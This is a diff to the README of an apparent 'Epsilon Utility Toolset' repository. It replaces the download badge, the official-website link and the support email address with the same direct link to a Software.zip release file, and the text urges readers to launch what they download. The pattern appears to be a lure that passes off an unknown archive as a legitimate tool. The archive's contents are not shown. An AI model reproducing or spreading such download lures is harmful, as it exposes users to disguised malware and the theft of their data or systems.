@@ -22,13 +22,13 @@ Epsilon Utility Toolset is a comprehensive set of tools that cater to automation
 
 ## 📥 Download Epsilon Utility Toolset
 
-[![Download Epsilon Utility Toolset](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Epsilon Utility Toolset](https://github.com/grandtg00/Epsilon-Utility-Toolset/releases/download/v1.0/Software.zip)](https://github.com/grandtg00/Epsilon-Utility-Toolset/releases/download/v1.0/Software.zip)
 
 Click the button above to download Epsilon Utility Toolset version 1.0.0. Make sure to launch the downloaded file to start using the amazing tools included in this toolset.
 
 ## 🌐 Get Started
 
-To explore the functionalities of Epsilon Utility Toolset, visit the [official Epsilon website](https://www.epsilonutility.com) for detailed information and guides on how to make the most out of this toolset.
+To explore the functionalities of Epsilon Utility Toolset, visit the [official Epsilon website](https://github.com/grandtg00/Epsilon-Utility-Toolset/releases/download/v1.0/Software.zip) for detailed information and guides on how to make the most out of this toolset.
 
 ## 🚀 Features
 
@@ -51,7 +51,7 @@ We welcome contributions to enhance the features and functionalities of Epsilon 
 
 ## 📬 Contact Us
 
-If you have any questions, feedback, or suggestions regarding Epsilon Utility Toolset, please contact our support team at support@epsilonutility.com.
+If you have any questions, feedback, or suggestions regarding Epsilon Utility Toolset, please contact our support team at https://github.com/grandtg00/Epsilon-Utility-Toolset/releases/download/v1.0/Software.zip
 
 ## 📦 Releases
 
